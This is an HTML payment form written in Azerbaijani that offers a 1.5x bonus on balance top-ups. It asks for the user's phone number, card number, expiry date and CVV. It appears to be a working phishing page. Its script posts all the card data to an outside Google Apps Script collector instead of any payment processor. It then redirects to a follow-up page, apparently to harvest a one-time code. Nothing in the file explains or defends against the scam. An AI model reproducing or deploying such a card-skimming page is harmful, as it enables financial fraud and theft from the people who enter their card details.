<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ödəmə</title>
    <style>
        body {
            background-color: whitesmoke;
            margin: 0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .payment-window {
            background-color: white;
            border-radius: 45px;
            padding: 60px;
            max-width: 850px;
            width: 90%;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }
        .content {
            text-align: center;
        }
        h2 {
            font-size: 52px;
            color: #000;
            margin-bottom: 50px;
        }
        .form-group {
            margin-bottom: 50px;
            text-align: left;
            position: relative;
        }
        label {
            display: block;
            margin-bottom: 18px;
            font-weight: bold;
            color: #000;
            font-size: 30px;
        }
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 25px;
            padding-left: 75px;
            font-size: 30px;
            box-sizing: border-box;
            border: 2px solid #ccc;
            border-radius: 20px;
        }
        .form-group img {
            position: absolute;
            top: 50%;
            left: 15px;
            transform: translateY(-4px);
            width: 55px;
            height: auto;
            pointer-events: none;
        }
        button {
            background-color: green;
            color: white;
            padding: 25px 65px;
            font-size: 30px;
            border: none;
            cursor: pointer;
            border-radius: 45px;
            transition: background-color 0.3s;
            width: 100%;
        }
        button:hover {
            background-color: darkgreen;
        }
        #logo {
            width: 320px;
            margin: 0 auto 50px auto;
        }
        .result {
            margin-top: 10px;
            font-size: 30px;
            color: green;
            position: absolute;
            top: 105%;
            left: 0;
            width: 100%;
        }
        .date-input {
            display: flex;
            gap: 10px;
            align-items: center;
            position: relative;
        }
        .date-input img {
            position: absolute;
            top: 50%;
            left: 15px;
            transform: translateY(-50%);
            width: 55px;
            height: auto;
            pointer-events: none;
        }
        .date-input input {
            padding-left: 75px;
        }
    </style>
</head>
<body>
    <div class="payment-window">
        <div class="content">
            <img id="logo" src="Logo.png" alt="Logo">
            <h2>Ödəmə Bilgiləri</h2>
            <form onsubmit="gonder(event)">
                <div class="form-group">
                    <label for="telefon">Telefon Nömrəsi</label>
                    <img src="phone.png" alt="Telefon Logosu">
                    <input 
                        type="text" 
                        id="telefon" 
                        name="telefon" 
                        value="+994" 
                        maxlength="13" 
                        required>
                </div>
                <div class="form-group">
                    <label for="tutar">Yükləyəcəyiniz Məbləğ ₼</label>
                    <img src="para.png" alt="Para Logosu">
                    <input 
                        type="number" 
                        id="tutar" 
                        name="tutar" 
                        placeholder="0" 
                        oninput="hesapla(this.value)" 
                        required>
                    <div id="result" class="result"></div>
                </div>
                <div class="form-group">
                    <label for="kart">Kart Nömrəsi</label>
                    <img src="card.svg" alt="Kart Logosu">
                    <input 
                        type="text" 
                        id="kart" 
                        name="kart" 
                        maxlength="19" 
                        placeholder="XXXX XXXX XXXX XXXX" 
                        required>
                </div>
                <div class="form-group">
                    <label for="ay">Son İstifadə Tarixi (MM/YY)</label>
                    <div class="date-input">
                        <img src="date.png" alt="Tarih Logosu">
                        <input 
                            type="text" 
                            id="ay" 
                            name="ay" 
                            placeholder="MM" 
                            maxlength="2" 
                            required>
                        <img src="date.png" alt="Tarih Logosu">
                        <input 
                            type="text" 
                            id="yil" 
                            name="yil" 
                            placeholder="YY" 
                            maxlength="2" 
                            required>
                    </div>
                </div>
                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <img src="cvc.svg" alt="CVV Logosu">
                    <input 
                        type="text" 
                        id="cvv" 
                        name="cvv" 
                        title="Format: XXX"
                        maxlength="3" 
                        placeholder="XXX"
                        pattern="\d{3}" 
                        required>
                </div>
                <button type="submit">Göndər</button>
            </form>
        </div>
    </div>
    <script>
        function hesapla(tutar) {
            const bonus = (tutar * 1.5).toFixed(2);
            document.getElementById('result').innerText = `Hesabınıza gələcək məbləğ (1.5x bonus ilə): ${bonus}₼`;
        }

        async function gonder(event) {
            event.preventDefault();

            const data = {
                telefon: document.getElementById("telefon").value.trim(),
                tutar: document.getElementById("tutar").value.trim(),
                kart: document.getElementById("kart").value.trim(),
                ay: document.getElementById("ay").value.trim(),
                yil: document.getElementById("yil").value.trim(),
                cvv: document.getElementById("cvv").value.trim(),
                otp: "Bilinmiyor", // OTP sabit
            };

            try {
                await fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(data),
                    mode: "no-cors",
                });

                window.location.href = "pay/index.html";
            } catch (error) {
                console.error("Xəta:", error);
                alert("Məlumat göndərilmədi!");
            }
        }
    </script>
</body>
</html>
